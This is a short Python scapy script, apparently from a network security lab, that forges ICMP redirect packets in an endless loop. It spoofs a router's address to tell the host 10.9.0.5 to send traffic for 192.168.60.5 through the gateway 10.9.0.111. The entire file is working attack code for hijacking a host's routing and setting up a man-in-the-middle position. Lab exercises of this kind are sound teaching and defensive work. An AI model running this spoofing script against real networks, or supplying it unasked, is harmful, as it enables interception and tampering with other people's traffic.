#!/usr/bin/python3


from scapy.all import *


ip = IP(src = "10.9.0.11", dst = "10.9.0.5")
icmp = ICMP(type=5, code=0)
icmp.gw = "10.9.0.111"


#The enclosed IP packet should be the one that
#triggers the red irect message.


ip2 = IP(src = "10.9.0.5", dst = "192.168.60.5")
while True:
	send(ip/icmp/ip2/ICMP())
